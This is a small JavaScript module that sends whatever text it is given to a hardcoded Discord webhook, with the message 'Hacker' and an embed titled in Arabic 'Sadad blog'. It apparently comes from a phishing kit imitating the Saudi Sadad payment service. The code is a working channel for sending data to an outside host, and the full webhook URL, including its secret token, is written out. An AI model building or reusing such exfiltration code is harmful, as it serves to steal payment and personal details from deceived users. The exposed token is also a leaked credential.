import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324347704578412545/Cudt25db62t2Q3uCWZijTgOd6fiLhp_dNL_WLnlP61kf0_tszwboqR6fdqua8o8WhBux",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
